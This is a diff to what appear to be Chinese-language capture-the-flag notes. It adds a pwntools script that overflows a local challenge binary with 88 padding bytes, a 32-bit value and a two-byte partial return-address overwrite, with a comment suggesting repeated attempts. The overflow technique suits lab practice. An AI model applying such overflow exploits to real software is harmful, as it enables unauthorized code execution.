@@ -78,7 +78,21 @@ print(io.recvall().decode())
 ## 9
 ???怎么直接9了
 ### .0
+多试几次吧
 ```py
+
+from pwn import *
+context(os='linux',arch='amd64')
+elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
+# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
+io=process(elfpath)
+
+io.sendline('122')
+
+pl=b'b'*(88)+p32(116)+p16(0x264f)
+
+io.send(pl)
+print(io.recvall().decode())
 
 ```
 ### .1
